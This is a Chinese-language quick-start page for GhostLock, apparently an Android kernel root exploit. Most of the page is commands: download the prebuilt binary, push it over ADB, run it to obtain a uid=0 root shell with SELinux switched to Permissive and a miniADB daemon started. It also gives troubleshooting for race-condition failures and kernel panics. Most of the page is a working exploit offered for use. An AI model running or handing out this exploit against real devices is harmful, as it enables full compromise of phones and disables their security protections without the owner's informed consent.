---
title: 快速开始
description: 5 分钟内开始使用 GhostLock
---

## 前置条件

在开始之前，请确保满足以下条件：

- **电脑：** Windows/macOS/Linux
- **ADB 工具：** 已安装 Android SDK Platform Tools
- **手机：** 已开启 USB 调试
- **NDK：** Android NDK r27c 或更高版本（用于编译）

## 步骤 1：下载预编译二进制

如果你不想自己编译，可以直接下载预编译的二进制文件：

```bash
# 下载最新版本
curl -L -o ghostlock https://github.com/wzhdgithub/GhostLock/releases/download/v1.0.0/ghostlock

# 添加执行权限
chmod +x ghostlock
```

## 步骤 2：连接设备

```bash
# 检查设备连接
adb devices

# 确认内核版本（必须匹配）
adb shell uname -r
```

**重要：** 内核版本必须与 GhostLock 支持的版本匹配。查看 [支持的设备](/devices) 了解详情。

## 步骤 3：推送并运行

```bash
# 推送到手机
adb push ghostlock /data/local/tmp/

# 设置执行权限
adb shell chmod 755 /data/local/tmp/ghostlock

# 运行 exploit
adb shell /data/local/tmp/ghostlock
```

## 步骤 4：验证结果

成功运行后，你应该看到：

```bash
# 出现 root shell 提示符
#

# 验证 root 权限
id
# 输出: uid=0(root) gid=0(root) groups=0(root)

# 验证 SELinux 状态
getenforce
# 输出: Permissive
```

## 成功标志

- ✅ 出现 `#` 提示符（root shell）
- ✅ `id` 命令显示 `uid=0(root)`
- ✅ `getenforce` 返回 `Permissive`
- ✅ miniADB 守护进程启动（监听 USB ADB 端口）

## 常见问题

### Q: 出现 "no offsets for kernel: xxx"

**原因：** 内核版本不支持

**解决方案：**
1. 检查内核版本：`adb shell uname -r`
2. 查看 [支持的设备](/devices) 列表
3. 如果你的设备不在列表中，参考 [添加新设备](/add-device)

### Q: exploit 卡住不动

**原因：** 可能是竞争条件失败

**解决方案：**
1. 按 `Ctrl+C` 停止
2. 重新运行 exploit
3. 多试几次（通常 3-5 次会成功）

### Q: 出现 kernel panic

**原因：** 不太可能（未设置 panic_on_oops），但可能发生

**解决方案：**
1. 重启手机
2. 检查内核日志：`adb shell dmesg | tail -50`
3. 在 [GitHub Issues](https://github.com/wzhdgithub/GhostLock/issues) 报告问题

### Q: adb push 失败

**原因：** 权限不足

**解决方案：**
```bash
# 尝试使用 root 权限推送
adb root
adb push ghostlock /data/local/tmp/
```

## 下一步

- [使用指南](/usage) - 详细了解如何使用 GhostLock
- [漏洞分析](/vulnerability) - 深入了解漏洞原理
- [设备支持](/devices) - 查看支持的设备列表
